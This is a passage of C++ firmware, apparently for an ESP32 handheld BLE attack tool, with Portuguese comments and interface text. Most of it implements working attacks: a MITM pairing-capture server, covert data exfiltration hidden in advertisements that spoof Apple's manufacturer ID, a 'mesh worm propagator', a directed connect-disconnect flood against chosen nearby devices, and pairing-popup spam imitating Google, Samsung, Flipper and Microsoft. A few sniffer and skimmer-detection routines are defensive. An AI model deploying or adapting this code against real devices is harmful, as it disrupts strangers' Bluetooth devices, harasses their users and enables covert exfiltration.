      padprintln("");
      padprintln("Servidor MITM ativo");
      padprintln("Nome: WillySecure");
      padprintln("");
      padprintln("Dispositivos pareados: " +
                 String(mitm_callbacks->paired_devices.size()));
      padprintln("");

      if (!mitm_callbacks->paired_devices.empty()) {
        tft.setTextColor(TFT_GREEN);
        padprintln("Pareamentos capturados:");
        for (const auto &addr : mitm_callbacks->paired_devices) {
          padprintln("  " + bleAddressToString(addr));
        }
        tft.setTextColor(willyConfig.priColor);
      }

      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }

    vTaskDelay(100 / portTICK_PERIOD_MS);
  }

  pAdvertising->stop();
  deinitBLEAttackMode();
  returnToMenu = true;
}

/* void setPairingKeyCallback(PairingKeyCallback callback) {
    pairing_key_callback = callback;
} */

//================================================================================
// 8. ADVERTISEMENT STEALTH EXFIL - IMPLEMENTAÇÃO COMPLETA
//================================================================================

// Base64 encoding table
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void exfiltrateData(const uint8_t *data, size_t len, uint8_t encode_type) {
  std::vector<uint8_t> encoded;

  if (encode_type == 1) { // Base64
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (len--) {
      char_array_3[i++] = *(data++);
      if (i == 3) {
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] =
            ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] =
            ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (i = 0; i < 4; i++) {
          encoded.push_back(base64_chars[char_array_4[i]]);
        }
        i = 0;
      }
    }

    if (i) {
      for (int j = i; j < 3; j++) {
        char_array_3[j] = '\0';
      }
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] =
          ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] =
          ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

      for (int j = 0; j < i + 1; j++) {
        encoded.push_back(base64_chars[char_array_4[j]]);
      }
      while (i++ < 3) {
        encoded.push_back('=');
      }
    }
  } else if (encode_type == 2) { // XOR
    uint8_t key = 0x42;
    for (size_t i = 0; i < len; i++) {
      encoded.push_back(data[i] ^ key);
    }
  } else {
    // Raw
    for (size_t i = 0; i < len; i++) {
      encoded.push_back(data[i]);
    }
  }

  // Cria advertising data com dados exfiltrados
  NimBLEAdvertisementData advData;
  advData.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);

  // Dados no campo manufacturer
  std::vector<uint8_t> mfg;
  mfg.push_back(0x4C); // Apple Inc. (Example for real-world simulation)
  mfg.push_back(0x00);
  for (auto byte : encoded) {
    if (mfg.size() < 28) { // Max manufacturer data
      mfg.push_back(byte);
    }
  }
  advData.addData(mfg);

  // Envia
  NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  vTaskDelay(100 / portTICK_PERIOD_MS);
  pAdvertising->stop();
}

void advertisementStealthExfil() {
  if (!initBLEAttackMode())
    return;

  // Solicita dados para exfiltrar
  String data = keyboard("Dados secretos", 64, "Dados p/ exfiltrar:");
  if (data.length() == 0) {
    returnToMenu = true;
    return;
  }

  // Menu de codificação
  options = {
      {"Base64",
       []() {
         displayWarning("Em Desenvolvimento");
         delay(1000);
       }},
      {"XOR",
       []() {
         displayWarning("Em Desenvolvimento");
         delay(1000);
       }},
      {"Raw",
       []() {
         displayWarning("Em Desenvolvimento");
         delay(1000);
       }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  drawMainBorderWithTitle("Stealth Exfil");
  padprintln("");
  padprintln("Exfiltrando dados...");

  ble_attack_running = true;
  uint32_t packet_count = 0;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    // Exfiltra dados
    exfiltrateData((const uint8_t *)data.c_str(), data.length(), 1);
    packet_count++;

    // Atualiza display
    if (millis() - last_update > 500) {
      drawMainBorderWithTitle("Stealth Exfil");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Exfiltrando via advertising...");
      padprintln("");
      padprintln("Dados: " + data.substring(0, 20) + "...");
      padprintln("Pacotes: " + String(packet_count));
      padprintln("Codificacao: Base64");
      padprintln("");
      tft.setTextColor(TFT_GREEN);
      padprintln("Exfiltracao oculta ativa");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }

    vTaskDelay(200 / portTICK_PERIOD_MS);
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 9. BLE MESH WORM PROPAGATOR - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void meshWormPropagator() {
  MeshWormConfig config;

  options = {
      {"Auto Spread", [&]() { config.auto_spread = true; }},
      {"Manual", [&]() { config.auto_spread = false; }},
  };
  addOptionToMainMenu();
  loopOptions(options);

  if (returnToMenu)
    return;

  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle("Mesh Worm");
  padprintln("");
  padprintln("Iniciando propagador...");

  std::vector<MeshNode> infected_nodes;

  ble_attack_running = true;
  uint32_t last_update = millis();
  uint32_t last_spread = millis();
  uint32_t scan_count = 0;

  while (ble_attack_running) {
    // Scan por dispositivos BLE
    NimBLEScan *pScan = NimBLEDevice::getScan();
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);

    NimBLEScanResults results =
        pScan->getResults(config.scan_duration_ms / 1000);
    scan_count++;

    // Processa resultados
    for (int i = 0; i < results.getCount(); i++) {
      const NimBLEAdvertisedDevice *device = results.getDevice(i);

      // Verifica se é dispositivo IoT mesh
      if (device->haveServiceUUID()) {
        bool is_mesh_device = false;

        // Verifica UUIDs de serviços mesh comuns
        std::vector<std::string> mesh_uuids = {
            "1827", // Mesh Provisioning
            "1828", // Mesh Proxy
        };

        for (const auto &uuid : mesh_uuids) {
          if (device->isAdvertisingService(NimBLEUUID(uuid))) {
            is_mesh_device = true;
            break;
          }
        }

        if (is_mesh_device) {
          // Adiciona à lista de infectados
          MeshNode node;
          node.address = device->getAddress();
          node.infected = true;
          node.hop_count = 0;
          node.last_seen = millis();
          infected_nodes.push_back(node);

          Serial.printf("Mesh device found: %s\n",
                        bleAddressToString(node.address).c_str());
        }
      }
    }

    // Propaga automaticamente
    if (config.auto_spread &&
        millis() - last_spread > config.spread_interval_ms) {
      // Advertising com payload "infectado"
      NimBLEAdvertisementData advData;
      advData.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);

      // Mesh provisioning service
      advData.addServiceUUID(NimBLEUUID("1827"));

      // Payload malicioso (simplificado)
      std::vector<uint8_t> worm_payload = {0xDE, 0xAD, 0xBE, 0xEF};
      advData.addData(worm_payload);

      NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
      pAdvertising->setAdvertisementData(advData);
      pAdvertising->start();
      vTaskDelay(100 / portTICK_PERIOD_MS);
      pAdvertising->stop();

      last_spread = millis();
    }

    // Atualiza display
    if (millis() - last_update > 1000) {
      drawMainBorderWithTitle("Mesh Worm");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Propagador ativo...");
      padprintln("");
      padprintln("Nos infectados: " + String(infected_nodes.size()));
      padprintln("Scans: " + String(scan_count));
      padprintln("");

      if (!infected_nodes.empty()) {
        tft.setTextColor(TFT_RED);
        padprintln("Ultimos infectados:");
        int count = 0;
        for (const auto &node : infected_nodes) {
          if (count++ < 3) {
            padprintln("  " + bleAddressToString(node.address));
          }
        }
        tft.setTextColor(willyConfig.priColor);
      }

      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// 10. DIRECTED DISCONNECT FLOOD - IMPLEMENTAÇÃO COMPLETA
//================================================================================

void addDisconnectTarget(const NimBLEAddress &address) {
  disconnect_targets.push_back(address);
}

void clearDisconnectTargets() { disconnect_targets.clear(); }

void directedDisconnectFlood() {
  if (!initBLEAttackMode())
    return;

  // Scan por dispositivos
  drawMainBorderWithTitle("Disconnect Flood");
  padprintln("");
  padprintln("Escaneando alvos...");

  NimBLEScan *pScan = NimBLEDevice::getScan();
  pScan->setActiveScan(true);
  NimBLEScanResults results = pScan->getResults(5);

  // Lista dispositivos encontrados
  options.clear();
  std::vector<NimBLEAddress> found_addresses;

  for (int i = 0; i < results.getCount(); i++) {
    const NimBLEAdvertisedDevice *device = results.getDevice(i);
    String name = device->getName().c_str();
    if (name.length() == 0) {
      name = bleAddressToString(device->getAddress());
    }
    found_addresses.push_back(device->getAddress());
    options.push_back({name.substring(0, 18).c_str(),
                       [=]() { addDisconnectTarget(found_addresses[i]); }});
  }

  addOptionToMainMenu();

  options.push_back({"Todos", [&]() {
                       for (const auto &addr : found_addresses) {
                         addDisconnectTarget(addr);
                       }
                     }});

  loopOptions(options, MENU_TYPE_SUBMENU, "Selecione Alvos");

  if (returnToMenu || disconnect_targets.empty()) {
    deinitBLEAttackMode();
    return;
  }

  drawMainBorderWithTitle("Disconnect Flood");
  padprintln("");
  padprintln("Alvos: " + String(disconnect_targets.size()));
  padprintln("Iniciando ataque...");

  ble_attack_running = true;
  uint32_t disconnect_count = 0;
  uint32_t last_update = millis();

  while (ble_attack_running) {
    // Para cada alvo
    for (const auto &target : disconnect_targets) {
      // Conecta
      NimBLEClient *pClient = NimBLEDevice::createClient();
      pClient->setConnectTimeout(1);

      if (pClient->connect(target)) {
        // Desconecta imediatamente
        pClient->disconnect();
        disconnect_count++;
      }

      // Remove cliente
      NimBLEDevice::deleteClient(pClient);

      vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    // Atualiza display
    if (millis() - last_update > 500) {
      drawMainBorderWithTitle("Disconnect Flood");
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln("Ataque de disconnect ativo");
      padprintln("");
      padprintln("Alvos: " + String(disconnect_targets.size()));
      padprintln("Disconnects: " + String(disconnect_count));
      padprintln("");

      tft.setTextColor(TFT_RED);
      padprintln("Alvos sendo atacados:");
      for (const auto &addr : disconnect_targets) {
        padprintln("  " + bleAddressToString(addr));
      }
      tft.setTextColor(willyConfig.priColor);

      padprintln("");
      padprintln("ESC para parar");
      last_update = millis();
    }

    if (check(EscPress)) {
      ble_attack_running = false;
    }
  }

  clearDisconnectTargets();
  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// HELPERS PARA REDUÇÃO DE TAMANHO (REFACTOR)
//================================================================================

static void
runGenericBLEScan(const char *title, const char *status,
                  std::function<void(NimBLEScanResults &)> onScanResults,
                  uint32_t scanTimeMs = 3000, bool activeScan = true) {
  if (!initBLEAttackMode())
    return;

  ble_attack_running = true;
  while (ble_attack_running) {
    drawMainBorderWithTitle(title);
    padprintln("");
    padprintln(status);
    padprintln("");
    padprintln("ESC para parar");

    NimBLEScan *pScan = NimBLEDevice::getScan();
    pScan->setActiveScan(activeScan);
    NimBLEScanResults results = pScan->getResults(scanTimeMs, false);

    drawMainBorderWithTitle(title);
    tft.setTextColor(willyConfig.priColor);
    padprintln("");

    onScanResults(results);

    padprintln("");
    padprintln("ESC para parar");

    pScan->clearResults();

    if (check(EscPress))
      ble_attack_running = false;
    vTaskDelay(100 / portTICK_PERIOD_MS);
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

static void runGenericBLESpam(
    const char *title, const char *status,
    std::function<void(NimBLEAdvertisementData &, String &)> setupAdv) {
  if (!initBLEAttackMode())
    return;

  drawMainBorderWithTitle(title);
  padprintln("");
  padprintln(status);
  padprintln("");
  padprintln("ESC para parar");

  ble_attack_running = true;
  uint32_t packet_count = 0;

  while (ble_attack_running) {
    NimBLEAdvertisementData advData;
    String name = "";
    setupAdv(advData, name);

    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
    if (name.length() > 0)
      pAdvertising->setName(name.c_str());
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->start();

    vTaskDelay(10 / portTICK_PERIOD_MS);
    pAdvertising->stop();

    packet_count++;

    if (packet_count % 50 == 0) {
      drawMainBorderWithTitle(title);
      tft.setTextColor(willyConfig.priColor);
      padprintln("");
      padprintln(status);
      padprintln("Pacotes: " + String(packet_count));
      padprintln("");
      padprintln("ESC para parar");
    }

    if (check(EscPress))
      ble_attack_running = false;
  }

  deinitBLEAttackMode();
  returnToMenu = true;
}

//================================================================================
// BLE SNIFFERS
//================================================================================

void bluetoothAnalyzer() {
  runGenericBLEScan(
      "BT Analyzer", "Escaneando dispositivos BLE...",
      [](NimBLEScanResults &results) {
        padprintln("Dispositivos: " + String(results.getCount()));
        padprintln("");
        for (int i = 0; i < (int)results.getCount() && i < 6; i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          String info = dev->getName().length() > 0
                            ? String(dev->getName().c_str())
                            : "???";
          info += " " + String(dev->getRSSI()) + "dBm";
          padprintln(info.substring(0, 30));
        }
      });
}

void flipperSniff() {
  static uint32_t flipper_count = 0;
  runGenericBLEScan(
      "Flipper Sniff", "Buscando Flipper Zero...",
      [](NimBLEScanResults &results) {
        for (int i = 0; i < (int)results.getCount(); i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          String name = dev->getName().c_str();
          if (name.startsWith("Flipper") || name.indexOf("Flipper") >= 0) {
            flipper_count++;
            tft.setTextColor(TFT_GREEN);
            padprintln("FLIPPER: " + name);
            padprintln("RSSI: " + String(dev->getRSSI()) + "dBm");
            padprintln("MAC: " +
                       String(std::string(dev->getAddress()).c_str()));
            tft.setTextColor(willyConfig.priColor);
          }
        }
        padprintln("Flippers: " + String(flipper_count));
      });
}

void airtagMonitor() {
  static uint32_t airtag_count = 0;
  runGenericBLEScan(
      "AirTag Monitor", "Monitorando AirTags...",
      [](NimBLEScanResults &results) {
        for (int i = 0; i < (int)results.getCount(); i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          if (dev->haveManufacturerData()) {
            const uint8_t *mfgData =
                (const uint8_t *)dev->getManufacturerData().data();
            if (dev->getManufacturerData().length() >= 2 &&
                mfgData[0] == 0x4C && mfgData[1] == 0x00) {
              airtag_count++;
              tft.setTextColor(TFT_YELLOW);
              padprintln("Apple: " + String(dev->getRSSI()) + "dBm");
              padprintln("MAC: " +
                         String(std::string(dev->getAddress()).c_str()));
              tft.setTextColor(willyConfig.priColor);
            }
          }
        }
        padprintln("Apple tags: " + String(airtag_count));
      },
      3000, false);
}

void btWardriveContinuous() {
  static uint32_t total_unique = 0;
  static std::map<String, int> seen_devices;
  runGenericBLEScan(
      "BT Wardrive", "Wardriving BLE continuo...",
      [](NimBLEScanResults &results) {
        for (int i = 0; i < (int)results.getCount(); i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          String addr = std::string(dev->getAddress()).c_str();
          if (seen_devices.find(addr) == seen_devices.end()) {
            seen_devices[addr] = dev->getRSSI();
            total_unique++;
          }
        }
        padprintln("Unicos: " + String(total_unique));
        padprintln("Ultimo scan: " + String(results.getCount()));
      },
      2000);
}

void flockSniff() {
  runGenericBLEScan(
      "Flock Sniff", "Detectando IoT flocks...",
      [](NimBLEScanResults &results) {
        int iot_count = 0;
        for (int i = 0; i < (int)results.getCount(); i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          if (dev->haveServiceUUID()) {
            iot_count++;
            String name = dev->getName().length() > 0
                              ? String(dev->getName().c_str())
                              : "IoT";
            padprintln(name + " " + String(dev->getRSSI()) + "dBm");
          }
        }
        padprintln("");
        padprintln("Dispositivos IoT: " + String(iot_count));
      });
}

void detectCardSkimmers() {
  runGenericBLEScan(
      "Skimmer Detect", "Buscando skimmers BLE...",
      [](NimBLEScanResults &results) {
        int suspect_count = 0;
        for (int i = 0; i < (int)results.getCount(); i++) {
          const NimBLEAdvertisedDevice *dev = results.getDevice(i);
          String name = String(dev->getName().c_str());
          name.toUpperCase();
          if (name.startsWith("HC-") || name.startsWith("JDY-") ||
              name.startsWith("CC41") || name.startsWith("BT05")) {
            suspect_count++;
            tft.setTextColor(TFT_RED);
            padprintln("SUSPEITO: " + String(dev->getName().c_str()) + " " +
                       String(dev->getRSSI()) + "dBm");
            tft.setTextColor(willyConfig.priColor);
          }
        }
        padprintln("");
        if (suspect_count > 0) {
          tft.setTextColor(TFT_RED);
          padprintln("ALERTA: " + String(suspect_count) + " suspeito(s)!");
        } else {
          tft.setTextColor(TFT_GREEN);
          padprintln("Nenhum skimmer detectado");
        }
        tft.setTextColor(willyConfig.priColor);
      },
      5000);
}

//================================================================================
// BLE SPAM AVANÇADO
//================================================================================

void googleBLESpam() {
  runGenericBLESpam("Google Spam", "Spam Google Fast Pair...",
                    [](NimBLEAdvertisementData &advData, String &name) {
                      uint8_t serviceData[] = {0x2C,
                                               0xFE,
                                               (uint8_t)random(255),
                                               (uint8_t)random(255),
                                               (uint8_t)random(255),
                                               (uint8_t)random(255)};
                      advData.addData(serviceData, 6);
                    });
}

void flipperBLESpam() {
  runGenericBLESpam("Flipper Spam", "Spam Flipper BLE...",
                    [](NimBLEAdvertisementData &advData, String &name) {
                      name = "Flipper_" + String(random(9999));
                      std::vector<uint8_t> mfgData = {0xFF, 0xFF};
                      for (int i = 0; i < 10; i++)
                        mfgData.push_back(random(255));
                      advData.setManufacturerData(mfgData.data(),
                                                  mfgData.size());
                    });
}

void samsungBLESpam() {
  runGenericBLESpam("Samsung Spam", "Spam Samsung BLE...",
                    [](NimBLEAdvertisementData &advData, String &name) {
                      std::vector<uint8_t> mfgData = {0x75, 0x00, 0x01};
                      for (int i = 0; i < 10; i++)
                        mfgData.push_back(random(255));
                      advData.setManufacturerData(mfgData.data(),
                                                  mfgData.size());
                    });
}

void swiftPairSpam() {
  runGenericBLESpam("Swift Pair", "Spam Microsoft Swift Pair...",
                    [](NimBLEAdvertisementData &advData, String &name) {
                      name = "Device_" + String(random(1000, 9999));
                      std::vector<uint8_t> mfgData = {0x06, 0x00, 0x03, 0x00};
                      for (int i = 0; i < 6; i++)
                        mfgData.push_back(random(255));
                      advData.setManufacturerData(mfgData.data(),
                                                  mfgData.size());
                    });
}

void bleSpamAll() {
  static uint32_t p_count = 0;
  runGenericBLESpam("BLE Spam All", "Spam todos os tipos...",
                    [](NimBLEAdvertisementData &advData, String &name) {
                      int type = p_count++ % 4;
                      std::vector<uint8_t> mfgData;
                      if (type == 0)
                        mfgData = {0x4C, 0x00, 0x12, 0x19};
                      else if (type == 1)
                        mfgData = {0x2C, 0xFE};
                      else if (type == 2)
                        mfgData = {0x75, 0x00, 0x01};
                      else
                        mfgData = {0x06, 0x00, 0x03, 0x00};
                      for (int i = 0; i < 6; i++)
                        mfgData.push_back(random(255));
                      advData.setManufacturerData(mfgData.data(),
                                                  mfgData.size());
                    });
}

//================================================================================
// MENUS
//================================================================================

void bleSniffersMenu() {
  options = {{"BT Analyzer", [=]() { bluetoothAnalyzer(); }},
             {"Flipper Sniff", [=]() { flipperSniff(); }},
             {"AirTag Monitor", [=]() { airtagMonitor(); }},
             {"BT Wardrive", [=]() { btWardriveContinuous(); }},
             {"Flock Sniff", [=]() { flockSniff(); }},
             {"Skimmer Detect", [=]() { detectCardSkimmers(); }}};
  addOptionToMainMenu();
  loopOptions(options, MENU_TYPE_SUBMENU, "BLE Sniffers");
}

void bleSpamMenu() {
  options = {{"Google Spam", [=]() { googleBLESpam(); }},
             {"Flipper Spam", [=]() { flipperBLESpam(); }},
             {"Samsung Spam", [=]() { samsungBLESpam(); }},
             {"Swift Pair", [=]() { swiftPairSpam(); }},
             {"Spam All", [=]() { bleSpamAll(); }}};
  addOptionToMainMenu();
  loopOptions(options, MENU_TYPE_SUBMENU, "BLE Spam Avancado");
}
